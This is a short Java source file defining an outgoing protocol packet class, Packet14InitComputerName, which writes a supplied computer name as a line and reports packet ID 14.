package com.redpois0n.packets.outgoing;

import java.io.DataOutputStream;

import com.redpois0n.common.io.StringWriter;


public class Packet14InitComputerName extends AbstractOutgoingPacket {

	private String computerName;

	public Packet14InitComputerName(String computerName) {
		this.computerName = computerName;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		sw.writeLine(computerName);
	}

	@Override
	public byte getPacketId() {
		return (byte) 14;
	}
}
